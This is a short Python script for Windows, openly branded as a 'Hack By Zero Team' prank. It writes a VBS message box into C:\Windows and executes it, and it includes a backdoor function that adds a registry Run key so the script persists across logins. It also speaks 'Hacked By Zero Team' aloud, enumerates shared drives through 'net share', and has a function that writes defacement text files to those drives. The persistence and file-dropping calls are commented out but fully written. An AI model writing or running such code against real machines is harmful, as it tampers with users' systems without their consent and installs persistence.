from subprocess import check_output 
import pyttsx3
from winreg import *

#This is Variable for List of Target Drive.
sys_drive=[]

#This is Function for Show MSG BOX
def show_msg():
    Warning = """
    MsgBox ("Hack By Zero Team")
    """
    f = open("C:\\Windows\\hack.vbs","w")
    for i in range(3):
        f.writelines(Warning)
    f.close()
    check_output("C:\\Windows\\hack.vbs",shell=True)

#This is Function for Backdoor MSGBOX
def backdoor():
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    try:
        key = OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_CURRENT_USER,keyVal)
    SetValueEx(key,"hack",0,REG_SZ,"C:\\Windows\\hack.vbs")
    CloseKey(key)

#This is Function for Hacker Voice
def sound_hacker():
    for i in range(3):
        e = pyttsx3.init()
        e.setProperty("rate",110)
        e.say("Hacked By Zero Team")
        e.runAndWait()

#This is Function for Find Drive
def system_drive():
    drive = ["A:","B:","C:","D:","E:","F:","G:","H:","Z:","N:"]
    cmd = check_output("net share",shell=True)
    for i in drive:
        if i in str(cmd):
            sys_drive.append(i)

#This is Function for Create Additinal Files.
def additional_file():
    for i in sys_drive:
        for j in range(10):
            if i == "C:":
                continue
            else:
                check_output(str(i) + " && echo Hacked with Zero Team > " + str(j) + ".txt",shell=True)

show_msg()       
#backdoor()
sound_hacker()
system_drive()
#additional_file()


